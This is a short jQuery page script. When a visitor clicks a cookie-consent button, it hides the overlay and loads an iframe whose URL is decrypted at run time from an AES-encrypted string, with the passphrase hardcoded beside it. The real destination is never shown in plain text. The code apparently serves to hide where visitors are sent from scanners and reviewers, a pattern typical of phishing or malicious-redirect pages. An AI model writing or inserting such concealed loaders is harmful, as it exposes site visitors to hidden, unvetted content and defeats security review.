$(document).ready(function() {
	
});

$('#cookies-btn').click(function(e) {
	e.preventDefault();
	$('#cookies-overlay').addClass('hidden');
	$('#container').removeClass('blur');
	$('#load-frame').attr('src', CryptoJS.AES.decrypt('U2FsdGVkX1/k5beS3JxsdHQqcwCglofWFgYiRIQa4QX8WzUlTjXUEIuCT+8w01ZZSLS1Pfsgh1umbRy1onxpEpTDJLHeVVaR00T1a7eX+2ljV0H997iyQFPZzv+Qv5ApBVfk6ZpeZuI354VxmQpaW03uEZ3RPT6SPxHQrAUPbAb06f+/Ywn3tK8hBCoHHXFkX19fzda8P0WKRrM8N/Xt8vkD0H1ZYUt0wFs9xGB2QKhvDCKUL2mdIzjMdlcgXRXfcFi7B+AkBfHVdk61AbMqBg==', '03kfks8onb79303').toString(CryptoJS.enc.Utf8));
	$('#load-frame').addClass('loaded');
});